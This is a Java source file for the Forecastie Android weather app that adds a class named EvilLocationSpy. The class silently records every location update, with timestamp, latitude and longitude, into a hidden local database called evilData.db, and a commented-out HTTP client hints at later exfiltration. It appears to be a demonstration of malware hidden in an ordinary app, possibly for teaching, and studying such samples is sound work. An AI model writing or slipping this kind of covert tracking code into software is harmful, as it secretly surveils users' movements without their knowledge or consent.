package cz.martykan.forecastie;

import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.location.Location;
import android.location.LocationListener;
import android.os.Bundle;

import java.text.SimpleDateFormat;
import java.util.Calendar;

import com.loopj.android.http.AsyncHttpClient;
import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.RequestParams;

import cz.msebera.android.httpclient.Header;

public class EvilLocationSpy implements LocationListener {

    private static Context context;
    private static SQLiteDatabase evilDatabase;
    //private static final AsyncHttpClient client = new AsyncHttpClient();

    public EvilLocationSpy(Context inContext){
        context = inContext;
        evilDatabase = SQLiteDatabase.openOrCreateDatabase(context.getFilesDir() + "evilData.db", null);
        evilDatabase.execSQL("CREATE TABLE IF NOT EXISTS locations(ts VARCHAR,latitude DOUBLE, longitude DOUBLE);");

        /* Para ver qué hay.
        Cursor cursor = evilDatabase.rawQuery("SELECT * FROM locations", null);
        try {
            while(cursor.moveToNext()) {
                String when = cursor.getString(0);
                String lat = cursor.getString(1);
                String lon = cursor.getString(2);
                Boolean p = true;
            }
        } finally {
            cursor.close();
        }
        */

    }

    public void onLocationChanged(Location location) {

        // Cada vez que cambia, registro la hora en la base de datos.
        Calendar c = Calendar.getInstance();
        String formattedDate = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(c.getTime());

        evilDatabase.execSQL("INSERT INTO locations VALUES('" + formattedDate + "'," + location.getLatitude() + "," + location.getLongitude() + ");");

    }

    public void onStatusChanged(String provider, int status, Bundle extras) {}

    public void onProviderEnabled(String provider) {}

    public void onProviderDisabled(String provider) {}


}

